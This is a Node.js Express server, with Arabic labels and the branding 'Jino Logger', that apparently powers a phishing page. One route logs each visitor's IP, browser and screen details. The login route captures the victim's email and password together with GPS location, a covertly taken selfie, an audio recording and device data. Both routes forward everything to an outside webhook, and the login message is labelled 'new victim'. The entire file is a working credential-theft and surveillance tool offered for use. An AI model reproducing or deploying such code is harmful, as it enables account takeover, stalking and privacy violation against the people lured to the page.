const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');
const app = express();

const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '25mb' }));
app.use(express.static(path.join(__dirname)));

// إشعار فتح الرابط
app.post('/api/visit', async (req, res) => {
  const { referrer, screen, timezone, language } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'];
  const time = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Baghdad' });

  const embed = {
    title: '👀 شخص فتح الرابط',
    color: 0xffaa00,
    fields: [
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '🕒 الوقت', value: time, inline: true },
      { name: '📍 الموقع', value: `https://ipinfo.io/${ip}`, inline: false },
      { name: '🔗 Referrer', value: referrer || 'مباشر', inline: false },
      { name: '🖥️ الشاشة', value: `${screen} | ${timezone} | ${language}`, inline: false },
      { name: '🧠 UA', value: `\`\`\`${ua}\`\`\``, inline: false }
    ],
    footer: { text: 'Jino Logger' }
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false }); }
});

// تسجيل الدخول
app.post('/api/login', async (req, res) => {
  const { email, password, gps, photo, audio, device } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Baghdad' });
  const mapLink = (gps && gps.lat) ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : `https://ipinfo.io/${ip}`;

  const embed = {
    title: '🎯 ضحية جديدة',
    color: 0xff0000,
    fields: [
      { name: '📧 الإيميل', value: `\`${email}\``, inline: false },
      { name: '🔑 الباسورد', value: `\`${password}\``, inline: false },
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '🕒 الوقت', value: timestamp, inline: true },
      { name: '📍 الموقع', value: mapLink, inline: false },
      { name: '🖥️ الجهاز', value: `**Platform:** ${device?.platform || 'N/A'}\n**Lang:** ${device?.language || 'N/A'}\n**Screen:** ${device?.screen || 'N/A'}\n**TZ:** ${device?.timezone || 'N/A'}\n**Battery:** ${device?.battery || 'N/A'}\n**Cores:** ${device?.cores || 'N/A'}\n**GPU:** ${device?.gpu || 'N/A'}`, inline: false },
      { name: '🧠 UA', value: `\`\`\`${userAgent}\`\`\``, inline: false }
    ],
    image: photo ? { url: 'attachment://selfie.jpg' } : undefined,
    footer: { text: 'Jino Logger' }
  };

  try {
    const form = new FormData();
    form.append('payload_json', JSON.stringify({ embeds: [embed] }));

    if (photo) {
      const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
      form.append('file1', Buffer.from(base64Data, 'base64'), { filename: 'selfie.jpg' });
    }
    if (audio) {
      const base64Audio = audio.replace(/^data:audio\/webm;base64,/, '');
      form.append('file2', Buffer.from(base64Audio, 'base64'), { filename: 'voice.webm' });
    }

    if (photo || audio) {
      await fetch(WEBHOOK_URL, { method: 'POST', body: form, headers: form.getHeaders() });
    } else {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      });
    }
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false });
  }
});

app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
